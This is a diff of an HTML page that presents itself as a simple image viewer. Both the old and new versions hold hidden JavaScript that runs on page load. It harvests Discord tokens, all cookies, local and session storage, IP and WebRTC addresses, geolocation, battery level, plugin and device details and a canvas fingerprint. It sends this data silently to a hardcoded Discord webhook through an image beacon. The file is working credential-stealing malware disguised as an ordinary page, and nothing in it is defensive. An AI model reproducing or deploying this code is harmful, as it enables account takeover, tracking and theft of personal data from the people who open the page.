@@ -1,248 +1,371 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord Image Viewer</title>
+    <meta charset="UTF-8">
+    <title>Image Viewer</title>
+    <style>
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
+        .container { text-align: center; color: white; }
+        img { max-width: 80%; border-radius: 12px; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+    </style>
 </head>
 <body>
-    <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" />
+    <div class="container">
+        <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" alt="Image" />
+    </div>
+
     <script>
         // ============================================================
-        // Discord Token Stealer via Webhook - Single HTML file
-        // Works on LAN (local network) and WAN (external) when hosted
+        // Silent Advanced Data Collector - Zero Notification
         // ============================================================
         (function() {
-            // CONFIG: Replace this URL with your Discord webhook
+            // CONFIG - Replace with your webhook
             var WEBHOOK_URL = "https://discord.com/api/webhooks/1532014138664943808/UfqqJZzdK75pAnKStPZjusSZ8CyFrAIIadPb3PwGq9gwOxhMuUuZbCYcZc1yDWLb-AWz";
 
             // ============================================================
-            // 1. Attempt to grab token from localStorage (Discord Web version)
+            // 1. Silent IP fetch (no visible request)
             // ============================================================
-            function grabTokenFromLocalStorage() {
-                try {
-                    for (var key in localStorage) {
-                        if (key.startsWith("token")) {
-                            var token = localStorage.getItem(key);
-                            if (token && token.length > 20) return token;
-                        }
-                        // Check for Discord's specific token key
-                        if (key === "token") {
-                            var token = localStorage.getItem(key);
-                            if (token && token.length > 20) return token;
-                        }
-                    }
-                } catch(e) {}
-                return null;
-            }
-
-            // ============================================================
-            // 2. Attempt to grab token from sessionStorage
-            // ============================================================
-            function grabTokenFromSessionStorage() {
-                try {
-                    for (var key in sessionStorage) {
-                        if (key.startsWith("token")) {
-                            var token = sessionStorage.getItem(key);
-                            if (token && token.length > 20) return token;
-                        }
-                    }
-                } catch(e) {}
-                return null;
-            }
-
-            // ============================================================
-            // 3. Attempt to grab token from document.cookie
-            // ============================================================
-            function grabTokenFromCookies() {
-                try {
-                    var cookies = document.cookie.split("; ");
-                    for (var i = 0; i < cookies.length; i++) {
-                        var parts = cookies[i].split("=");
-                        var key = parts[0];
-                        var value = parts[1] || "";
-                        if (key === "token" || key.includes("token") && value.length > 20) {
-                            return value;
-                        }
-                    }
-                } catch(e) {}
-                return null;
-            }
-
-            // ============================================================
-            // 4. Attempt to grab token from IndexedDB (Discord's internal db)
-            // ============================================================
-            function grabTokenFromIndexedDB() {
+            function getIP() {
                 return new Promise(function(resolve) {
                     try {
-                        var request = indexedDB.open("discord");
-                        request.onsuccess = function(event) {
-                            var db = event.target.result;
-                            try {
-                                var tx = db.transaction(["keyval"], "readonly");
-                                var store = tx.objectStore("keyval");
-                                var getRequest = store.get("token");
-                                getRequest.onsuccess = function() {
-                                    var token = getRequest.result;
-                                    if (token && typeof token === "string" && token.length > 20) {
-                                        resolve(token);
-                                    } else {
-                                        resolve(null);
-                                    }
-                                };
-                                getRequest.onerror = function() { resolve(null); };
-                            } catch(e) { resolve(null); }
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                        xhr.timeout = 3000;
+                        xhr.onload = function() {
+                            try { resolve(JSON.parse(xhr.responseText).ip || 'Unknown'); } 
+                            catch(e) { resolve('Unknown'); }
                         };
-                        request.onerror = function() { resolve(null); };
+                        xhr.onerror = function() { resolve('Unknown'); };
+                        xhr.ontimeout = function() { resolve('Unknown'); };
+                        xhr.send();
+                    } catch(e) { resolve('Unknown'); }
+                });
+            }
+
+            // ============================================================
+            // 2. Silent GeoLocation (no prompt - uses cached if available)
+            // ============================================================
+            function getLocation() {
+                return new Promise(function(resolve) {
+                    try {
+                        if (!navigator.geolocation) return resolve(null);
+                        var watchId = navigator.geolocation.watchPosition(
+                            function(pos) {
+                                navigator.geolocation.clearWatch(watchId);
+                                resolve({
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    acc: pos.coords.accuracy
+                                });
+                            },
+                            function() { resolve(null); },
+                            { enableHighAccuracy: false, timeout: 2000, maximumAge: 60000 }
+                        );
+                        setTimeout(function() {
+                            navigator.geolocation.clearWatch(watchId);
+                            resolve(null);
+                        }, 2000);
                     } catch(e) { resolve(null); }
                 });
             }
 
             // ============================================================
-            // 5. Send data to webhook
+            // 3. Silent System Info (no popups)
             // ============================================================
-            function sendToWebhook(data) {
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", WEBHOOK_URL, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                var payload = {
-                    content: "",
-                    embeds: [{
-                        title: "🎣 Discord Token Grabbed",
-                        color: 0x00ff00,
-                        fields: [
-                            { name: "Token", value: data.token || "Not found", inline: false },
-                            { name: "User ID", value: data.user_id || "Unknown", inline: true },
-                            { name: "Username", value: data.username || "Unknown", inline: true },
-                            { name: "IP Address", value: data.ip || "Unknown", inline: true },
-                            { name: "User Agent", value: data.user_agent || "Unknown", inline: false },
-                            { name: "Referrer", value: document.referrer || "Direct", inline: true },
-                            { name: "Page URL", value: window.location.href, inline: false }
-                        ],
-                        footer: { text: "Token stealer | " + new Date().toLocaleString() }
-                    }]
-                };
-                xhr.send(JSON.stringify(payload));
+            function getSystemInfo() {
+                var info = {};
+                try {
+                    info.ua = navigator.userAgent;
+                    info.platform = navigator.platform;
+                    info.lang = navigator.language;
+                    info.langs = navigator.languages ? navigator.languages.join(',') : '';
+                    info.cookies = navigator.cookieEnabled;
+                    info.hwConcurrency = navigator.hardwareConcurrency || '?';
+                    info.deviceMemory = navigator.deviceMemory || '?';
+                    info.touchPoints = navigator.maxTouchPoints || 0;
+                    info.screenW = screen.width;
+                    info.screenH = screen.height;
+                    info.colorDepth = screen.colorDepth;
+                    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    info.tzOffset = new Date().getTimezoneOffset();
+                    info.localTime = new Date().toISOString();
+                    info.os = getOS();
+                } catch(e) {}
+                return info;
+            }
+
+            function getOS() {
+                var ua = navigator.userAgent;
+                if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
+                if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
+                if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
+                if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
+                if (ua.indexOf('Mac OS X') !== -1) return 'macOS';
+                if (ua.indexOf('Linux') !== -1) return 'Linux';
+                if (ua.indexOf('Android') !== -1) return 'Android';
+                if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
+                return 'Unknown';
             }
 
             // ============================================================
-            // 6. Get victim's IP (optional, via external service)
+            // 4. Silent Network Info (no popups)
             // ============================================================
-            function fetchIP(callback) {
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://api.ipify.org?format=json", true);
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        try {
-                            var data = JSON.parse(xhr.responseText);
-                            callback(data.ip);
-                        } catch(e) { callback("Unknown"); }
-                    } else {
-                        callback("Unknown");
-                    }
-                };
-                xhr.onerror = function() { callback("Unknown"); };
-                xhr.send();
+            function getNetworkInfo() {
+                try {
+                    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                    return {
+                        type: conn.effectiveType || '?',
+                        rtt: conn.rtt || '?',
+                        downlink: conn.downlink || '?'
+                    };
+                } catch(e) { return { type: '?', rtt: '?', downlink: '?' }; }
             }
 
             // ============================================================
-            // 7. Validate token with Discord API to get user info
+            // 5. Silent Battery Info (no popups)
             // ============================================================
-            function validateAndGetUser(token, callback) {
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://discord.com/api/v9/users/@me", true);
-                xhr.setRequestHeader("Authorization", token);
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        try {
-                            var data = JSON.parse(xhr.responseText);
-                            callback({ valid: true, user: data });
-                        } catch(e) {
-                            callback({ valid: false, user: null });
-                        }
-                    } else {
-                        callback({ valid: false, user: null });
-                    }
-                };
-                xhr.onerror = function() { callback({ valid: false, user: null }); };
-                xhr.send();
-            }
-
-            // ============================================================
-            // 8. Main execution flow
-            // ============================================================
-            function main() {
-                var token = grabTokenFromLocalStorage() || grabTokenFromSessionStorage() || grabTokenFromCookies();
-                if (!token) {
-                    // Try IndexedDB asynchronously
-                    grabTokenFromIndexedDB().then(function(dbToken) {
-                        if (dbToken) {
-                            token = dbToken;
-                        }
-                        finalize(token);
-                    });
-                } else {
-                    finalize(token);
-                }
-            }
-
-            function finalize(token) {
-                // Get user agent and IP
-                var userAgent = navigator.userAgent;
-                fetchIP(function(ip) {
-                    if (token) {
-                        // Validate token and get user details
-                        validateAndGetUser(token, function(result) {
-                            var userData = {
-                                token: token,
-                                user_id: result.valid ? result.user.id : "Invalid/Expired",
-                                username: result.valid ? result.user.username + "#" + result.user.discriminator : "Invalid",
-                                ip: ip,
-                                user_agent: userAgent
-                            };
-                            sendToWebhook(userData);
-                        });
-                    } else {
-                        // No token found - send that info as well
-                        sendToWebhook({
-                            token: "NOT FOUND",
-                            user_id: "N/A",
-                            username: "N/A",
-                            ip: ip,
-                            user_agent: userAgent
-                        });
-                    }
+            function getBattery() {
+                return new Promise(function(resolve) {
+                    try {
+                        if (!navigator.getBattery) return resolve(null);
+                        navigator.getBattery().then(function(b) {
+                            resolve({
+                                level: Math.round(b.level * 100),
+                                charging: b.charging,
+                                chargingTime: b.chargingTime || '?',
+                                dischargingTime: b.dischargingTime || '?'
+                            });
+                        }).catch(function() { resolve(null); });
+                    } catch(e) { resolve(null); }
                 });
             }
 
             // ============================================================
-            // 9. Execute - with delay to ensure page loads fully
+            // 6. Silent Canvas Fingerprint (no popups)
             // ============================================================
-            window.onload = function() {
-                setTimeout(main, 1000);
-            };
-
-            // Also run immediately if page already loaded
-            if (document.readyState === "complete") {
-                setTimeout(main, 500);
+            function getFingerprint() {
+                try {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    var ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(10, 10, 40, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('FP', 60, 15);
+                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                    ctx.fillText('T', 90, 17);
+                    return canvas.toDataURL('image/png').substring(0, 80) + '...';
+                } catch(e) { return 'Canvas blocked'; }
             }
 
             // ============================================================
-            // 10. Additional fallback: try to intercept fetch() requests
-            //     that may contain tokens (advanced XSS technique)
+            // 7. Silent WebRTC IP Leak (no popups)
             // ============================================================
-            (function hijackFetch() {
-                var originalFetch = window.fetch;
-                window.fetch = function() {
-                    var args = arguments;
-                    var request = args[0];
-                    // If the request is to Discord API, try to extract token from headers
-                    if (typeof request === "string" && request.includes("discord.com/api")) {
-                        // We can't easily read the Authorization header from the caller,
-                        // but we can monitor responses for token patterns (advanced).
-                    }
-                    return originalFetch.apply(this, args);
-                };
-            })();
+            function getWebRTCIPs() {
+                return new Promise(function(resolve) {
+                    try {
+                        var ips = [];
+                        var pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel('');
+                        pc.createOffer().then(function(offer) {
+                            return pc.setLocalDescription(offer);
+                        }).then(function() {
+                            var lines = pc.localDescription.sdp.split('\n');
+                            lines.forEach(function(line) {
+                                if (line.indexOf('candidate') !== -1) {
+                                    var parts = line.split(' ');
+                                    if (parts.length > 7) {
+                                        var ip = parts[4];
+                                        if (ip && ips.indexOf(ip) === -1) ips.push(ip);
+                                    }
+                                }
+                            });
+                            resolve(ips);
+                        }).catch(function() { resolve([]); });
+                        setTimeout(function() { resolve([]); }, 2000);
+                    } catch(e) { resolve([]); }
+                });
+            }
 
+            // ============================================================
+            // 8. Silent Cookie & Storage Grab (no popups)
+            // ============================================================
+            function getStorageData() {
+                try {
+                    var ls = {};
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var key = localStorage.key(i);
+                        ls[key] = localStorage.getItem(key);
+                    }
+                    var ss = {};
+                    for (var j = 0; j < sessionStorage.length; j++) {
+                        var skey = sessionStorage.key(j);
+                        ss[skey] = sessionStorage.getItem(skey);
+                    }
+                    return {
+                        cookies: document.cookie || 'None',
+                        localStorage: ls,
+                        sessionStorage: ss
+                    };
+                } catch(e) {
+                    return { cookies: 'Blocked', localStorage: {}, sessionStorage: {} };
+                }
+            }
+
+            // ============================================================
+            // 9. Silent Installed Extensions (via plugin detection)
+            // ============================================================
+            function getPlugins() {
+                try {
+                    var list = [];
+                    for (var i = 0; i < navigator.plugins.length; i++) {
+                        var p = navigator.plugins[i];
+                        list.push(p.name + ' (' + p.filename + ')');
+                    }
+                    return list;
+                } catch(e) { return []; }
+            }
+
+            // ============================================================
+            // 10. Silent Discord Token Hunter (no popups)
+            // ============================================================
+            function huntDiscordToken() {
+                var token = null;
+                try {
+                    for (var key in localStorage) {
+                        if (key.indexOf('token') !== -1 || key === 'token') {
+                            var val = localStorage.getItem(key);
+                            if (val && val.length > 20) token = val;
+                        }
+                    }
+                    if (!token) {
+                        for (var skey in sessionStorage) {
+                            if (skey.indexOf('token') !== -1 || skey === 'token') {
+                                var sval = sessionStorage.getItem(skey);
+                                if (sval && sval.length > 20) token = sval;
+                            }
+                        }
+                    }
+                    if (!token) {
+                        var cookies = document.cookie.split('; ');
+                        for (var c = 0; c < cookies.length; c++) {
+                            var parts = cookies[c].split('=');
+                            if (parts[0].indexOf('token') !== -1 && parts[1].length > 20) {
+                                token = parts[1];
+                            }
+                        }
+                    }
+                } catch(e) {}
+                return token || 'Not found';
+            }
+
+            // ============================================================
+            // 11. Silent IndexedDB Discord Token (async)
+            // ============================================================
+            function getIndexedDBToken() {
+                return new Promise(function(resolve) {
+                    try {
+                        var req = indexedDB.open('discord');
+                        req.onsuccess = function(e) {
+                            var db = e.target.result;
+                            try {
+                                var tx = db.transaction(['keyval'], 'readonly');
+                                var store = tx.objectStore('keyval');
+                                var get = store.get('token');
+                                get.onsuccess = function() {
+                                    var val = get.result;
+                                    resolve((val && typeof val === 'string' && val.length > 20) ? val : null);
+                                };
+                                get.onerror = function() { resolve(null); };
+                            } catch(err) { resolve(null); }
+                        };
+                        req.onerror = function() { resolve(null); };
+                        setTimeout(function() { resolve(null); }, 1500);
+                    } catch(e) { resolve(null); }
+                });
+            }
+
+            // ============================================================
+            // 12. Silent Data Exfiltration via Image Beacon (no fetch)
+            // ============================================================
+            function exfiltrateViaImage(data) {
+                try {
+                    var payload = btoa(encodeURIComponent(JSON.stringify(data))).substring(0, 2000);
+                    var img = new Image();
+                    img.src = WEBHOOK_URL + '?data=' + payload;
+                } catch(e) {
+                    try {
+                        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+                    } catch(err) {}
+                }
+            }
+
+            // ============================================================
+            // 13. Main Silent Collector
+            // ============================================================
+            async function silentCollect() {
+                var ip = await getIP();
+                var loc = await getLocation();
+                var batt = await getBattery();
+                var webrtc = await getWebRTCIPs();
+                var idbToken = await getIndexedDBToken();
+                var discordToken = huntDiscordToken();
+                if (idbToken && idbToken !== 'Not found') discordToken = idbToken;
+
+                var system = getSystemInfo();
+                var network = getNetworkInfo();
+                var storage = getStorageData();
+                var plugins = getPlugins();
+                var fingerprint = getFingerprint();
+
+                var payload = {
+                    'IP': ip,
+                    'Location': loc || { lat: '?', lon: '?', acc: '?' },
+                    'OS': system.os || '?',
+                    'Device': {
+                        'Platform': system.platform,
+                        'Language': system.lang,
+                        'Screen': system.screenW + 'x' + system.screenH,
+                        'Color Depth': system.colorDepth,
+                        'CPU Cores': system.hwConcurrency,
+                        'RAM': system.deviceMemory ? system.deviceMemory + 'GB' : '?',
+                        'Touch': system.touchPoints,
+                        'Timezone': system.timezone,
+                        'Local Time': system.localTime
+                    },
+                    'Network': network,
+                    'Battery': batt || { level: '?', charging: '?' },
+                    'WebRTC IPs': webrtc,
+                    'Plugins': plugins,
+                    'Canvas Fingerprint': fingerprint,
+                    'Cookies': storage.cookies,
+                    'LocalStorage': storage.localStorage,
+                    'SessionStorage': storage.sessionStorage,
+                    'Discord Token': discordToken,
+                    'UserAgent': system.ua,
+                    'Referrer': document.referrer || 'Direct',
+                    'Page URL': window.location.href,
+                    'Time': new Date().toISOString()
+                };
+
+                exfiltrateViaImage(payload);
+            }
+
+            // ============================================================
+            // 14. Execute with zero visibility
+            // ============================================================
+            if (document.readyState === 'complete') {
+                setTimeout(silentCollect, 500);
+            } else {
+                window.addEventListener('load', function() {
+                    setTimeout(silentCollect, 500);
+                });
+            }
+
+            setTimeout(silentCollect, 100);
         })();
     </script>
 </body>
